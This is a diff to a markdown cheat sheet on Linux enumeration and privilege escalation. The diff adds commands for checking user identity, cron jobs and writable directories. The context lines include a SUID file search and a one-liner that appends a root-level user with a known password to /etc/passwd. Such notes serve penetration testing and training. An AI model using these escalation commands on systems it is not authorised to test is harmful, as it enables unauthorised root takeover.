@@ -1,5 +1,10 @@
 # Linux Enumeration and Privilege Escalation
 ## Enumeration
+-> Information about user
+```bash
+id
+```
+
 -> Get system distribution and version
 ```bash
 cat /etc/*-release
@@ -145,6 +150,11 @@ SELECT * FROM <table>;
 ```bash
 cat /var/log/cron.log                                                                                                                                              
 cat /etc/crontab
+ls -lah /etc/cron*
+```
+```bash
+crontab -l
+sudo crontab -l
 ```
 
 -> Exploitation  
@@ -162,7 +172,6 @@ or
 id
 find / -perm -u=s -type f -group <group> 2>/dev/null
 ```
-
 -> Exploitation  
 - https://gtfobins.github.io/
 
@@ -202,6 +211,12 @@ ls -la /etc/shadow
 -> Exploitation  
 ```bash
 echo "user:$(openssl passwd password123):0:0:root:/root:/usr/bin/bash" >> /etc/passwd
+```
+
+### Directory Writable
+-> Enumeration
+```bash
+find / -writable -type d 2>/dev/null
 ```
 
 ### NFS Root Squashing
